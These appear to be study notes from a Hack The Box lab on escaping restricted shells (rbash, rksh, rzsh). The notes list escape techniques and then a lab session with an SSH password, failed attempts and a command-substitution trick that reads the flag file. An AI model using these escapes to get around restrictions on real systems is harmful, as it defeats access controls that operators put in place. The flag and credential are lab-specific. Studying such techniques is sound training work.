# Escaping Restricted Shells

To protect the security and integrity of the network, the organization's IT team decided to implement restricted shells for all users

## RBASH
https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html

--> it limits the user's ability to use certain features of the Bourne shell, such as changing directories, setting or modifying environment variables, and executing commands in other directories.

## RKSH
https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command

--> it limits the user's ability to use certain features of the Korn shell, such as executing commands in other directories, creating or modifying shell functions, and modifying the shell environment.

## RZSH
https://manpages.debian.org/experimental/zsh/rzsh.1.en.html

--> it limits the user's ability to use certain features of the Z shell, such as running shell scripts, defining aliases, and modifying the shell environment.

In term of how deep we can personnalize the restricted shell :
1st level : RBASH , 2nd level : RKSH and 3rd level : RZSH


## Escaping

Command injection
ls -l `pwd` 

Command Substitution
enclosing them in backticks (`)

Command Chaining
semicolon (;) or a vertical bar (|),

Environment Variables
modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell

Shell Functions
call shell functions that execute commands not restricted by the shell

## LAB

ssh htb-user@10.129.205.109
HTB_@cademy_us3r!

cat /flag.txt
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names

`cat /flag.txt`
`ls`
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names


pwd
/home/htb-user

pwd ; ls

pwd `ls` 

-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
/home/htb-user

text='ls -l'
echo "${text}"
ls -l

$text

echo "$(ls -l)"
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names

echo "$(<flag.txt )"
HTB{35c4p3_7h3_r3stricted_5h311}
